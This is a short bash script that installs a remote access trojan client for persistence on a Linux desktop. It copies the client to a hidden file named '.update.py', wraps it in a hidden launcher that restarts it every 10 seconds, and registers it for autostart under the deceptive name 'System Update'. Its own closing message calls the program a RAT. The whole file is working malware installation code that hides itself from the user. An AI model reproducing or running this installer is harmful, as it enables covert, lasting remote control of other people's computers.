#!/bin/bash

RAT_FILE="11_rat_client.py"
DEST="$HOME/.local/bin/.update.py"
LAUNCHER="$HOME/.local/bin/.rat_launcher.sh"
AUTOSTART="$HOME/.config/autostart/update.desktop"
USERNAME=$(whoami)


mkdir -p ~/.local/bin
cp "$RAT_FILE" "$DEST"
chmod +x "$DEST"


cat > "$LAUNCHER" <<EOF
#!/bin/bash
while true; do
    python3 "$DEST"
    sleep 10
done
EOF
chmod +x "$LAUNCHER"


mkdir -p ~/.config/autostart
cat > "$AUTOSTART" <<EOF
[Desktop Entry]
Name=System Update
Exec=$LAUNCHER
Type=Application
EOF

echo "[+] Installed successfully. RAT will auto-reconnect every 10 seconds if disconnected."
